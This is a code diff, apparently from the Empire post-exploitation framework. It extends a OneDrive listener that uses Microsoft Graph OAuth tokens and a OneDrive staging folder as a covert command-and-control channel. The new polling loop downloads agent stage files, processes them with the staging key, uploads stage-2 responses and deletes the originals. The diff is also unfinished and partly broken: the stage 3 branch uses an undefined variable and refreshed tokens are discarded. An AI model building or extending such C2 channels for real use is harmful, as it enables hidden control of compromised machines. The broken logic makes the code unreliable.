@@ -1,10 +1,12 @@
 import base64
 import random
 import os
+import re
 import time
 import copy
+import traceback
+import sys
 from pydispatch import dispatcher
-import requests
 from requests import Request, Session
 
 #Empire imports
@@ -154,7 +156,7 @@ class Listener:
         def get_token(client_id, code):
             params = {'client_id': client_id,
                       'grant_type': 'authorization_code',
-                      'scope':'files.readwrite offline_access',
+                      'scope': 'files.readwrite offline_access',
                       'code': code,
                       'redirect_uri': redirectURI}
             try:
@@ -163,27 +165,33 @@ class Listener:
                 # self.mainMenu.listeners.update_listener_options(listenerName, "RefreshToken", r.json()['refresh_token'])
                 print "in 'get_token'"
                 rToken = r.json()
+                rToken['expires_at'] = time.time() + (int)(rToken['expires_in']) - 15
                 rToken['update'] = True
+                dispatcher.send("[*] Got new auth token", sender="listeners/onedrive")
                 return rToken
             except KeyError, e:
                 print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description']))
                 raise
 
-        def refresh_token(client_id, refresh_token):
+        def refresh_token(client_id, refreshtoken):
             params = {'client_id': client_id,
                       'grant_type': 'refresh_token',
                       'scope': 'files.readwrite offline_access',
-                      'refresh_token': refresh_token,
+                      'refresh_token': refreshtoken,
                       'redirect_uri': redirectURI}
-            r = s.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=params)
-            s.headers['Authorization'] = "Bearer " + r.json()['access_token']
-            # self.mainMenu.listeners.update_listener_options(listenerName, "RefreshToken", r.json()['refresh_token'])
-            print("in 'refresh_token'")
-            rToken = r.json()
-            rToken['update'] = True
-            return rToken
+            try:
+                r = s.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=params)
+                s.headers['Authorization'] = "Bearer " + r.json()['access_token']
+                rToken = r.json()
+                rToken['expires_at'] = time.time() + (int)(rToken['expires_in']) - 15
+                rToken['update'] = True
+                dispatcher.send("[*] Refreshed auth token", sender="listeners/onedrive")
+                return rToken
+            except KeyError, e:
+                print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description']))
+                raise
 
-        def test_token(client_id, token):
+        def test_token(token):
             headers = s.headers.copy()
             headers['Authorization'] = 'Bearer ' + token
 
@@ -192,7 +200,7 @@ class Listener:
             return request.ok
 
         def setup_folders():
-            if not (test_token(clientID, token['access_token'])):
+            if not (test_token(token['access_token'])):
                 raise ValueError("Could not set up folders, access token invalid")
 
             baseObject = s.get("%s/drive/root:/%s" % (baseURL, baseFolder))
@@ -226,29 +234,54 @@ class Listener:
         resultsFolder = listenerOptions['ResultsFolder']['Value'].strip('/')
         redirectURI = listenerOptions['RedirectURI']['Value']
         baseURL = "https://graph.microsoft.com/v1.0"
-        updateToken = False
 
         s = Session()
 
-        if(refreshToken):
+        if refreshToken:
             token = refresh_token(clientID, refreshToken)
         else:
             token = get_token(clientID, authCode)
 
         setup_folders()
 
+        # Upload stage 0
+
         while True:
             time.sleep(int(pollInterval))
-            print(updateToken)
+            try:
+                if time.time() > token['expires_at']:
+                    refresh_token(clientID, token['refresh_token'])
+                if token['update']:
+                    self.mainMenu.listeners.update_listener_options(listenerName, "RefreshToken", token['refresh_token'])
+                    token['update'] = False
 
-            if token['update']:
-                print "In 'if updateToken'"
-                self.mainMenu.listeners.update_listener_options(listenerName, "RefreshToken", token['refresh_token'])
-                refreshToken = token['refresh_token']
-                token['update'] = False
+                search = s.get("%s/drive/items/root:/%s/%s:/search(q='{*_*.txt}')" % (baseURL, baseFolder, stagingFolder))
+                for item in search.json()['value']:
+                    print(item)
+                    try:
+                        agent_name, stage = re.search("^([A-Z]+)_([0-9]).txt", item['name']).groups()
+                        dispatcher.send("[*] Downloading %s/%s, %d bytes" % (stagingFolder,  item['name'], item['size']), sender="listeners/onedrive")
+                        content = s.get(item['@microsoft.graph.downloadUrl']).content
 
-            search = s.get("%s/drive/items/root:/%s/%s:/children" % (baseURL, baseFolder, stagingFolder))
-            print search.json()
+                        if stage == '1':
+                            print "Stage 1"
+                            lang, return_val = self.mainMenu.agents.handle_agent_data(stagingKey, content, listenerOptions)
+                            dispatcher.send("[*] Uploading %s/%s_2.txt, %d bytes" % (baseFolder, agent_name, len(return_val)))
+                            s.put("%s/drive/items/%s/:%s_2.txt:/content" % (baseURL, item['id'], agent_name), data=return_val)
+                            dispatcher.send("[*] Deleting %s/%s" % (stagingFolder, item['name']))
+                            s.delete("%s/drive/items/%s" % (baseURL, item['id']))
+
+                        if stage == '3':
+                            print "Stage 3"
+                            lang, return_val = self.mainMenu.agents.handle_agent_data(stagingKey, stageData, listenerOptions)
+
+
+                    except Exception, e:
+                        print(traceback.format_exc())
+
+
+            except Exception, e:
+                print(e)
 
 
     def start(self, name=''):
